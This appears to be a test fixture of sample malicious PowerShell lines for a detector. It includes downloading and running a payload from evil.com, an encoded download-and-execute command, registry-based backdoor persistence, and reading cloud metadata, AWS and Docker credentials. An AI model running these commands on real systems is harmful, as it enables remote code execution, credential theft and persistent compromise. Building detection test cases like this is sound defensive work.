# PowerShell malicious patterns test

# Download and execute
Invoke-WebRequest -Uri "http://evil.com/payload.exe" -OutFile "$env:TEMP\payload.exe"
Start-Process "$env:TEMP\payload.exe"

# Base64 encoded command
$encoded = "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA"
powershell.exe -EncodedCommand $encoded

# Persistence via registry
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell.exe -File C:\temp\backdoor.ps1" -PropertyType String -Force

# Cloud metadata access
Invoke-RestMethod -Uri "http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Credential harvesting
Get-Content "$env:USERPROFILE\.aws\credentials"
Get-Content "$env:APPDATA\Docker\config.json"

# Anti-debugging
if ([System.Diagnostics.Debugger]::IsAttached) { exit }

# DLL hijacking
[System.Runtime.InteropServices.DllImport("kernel32.dll")]
$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer()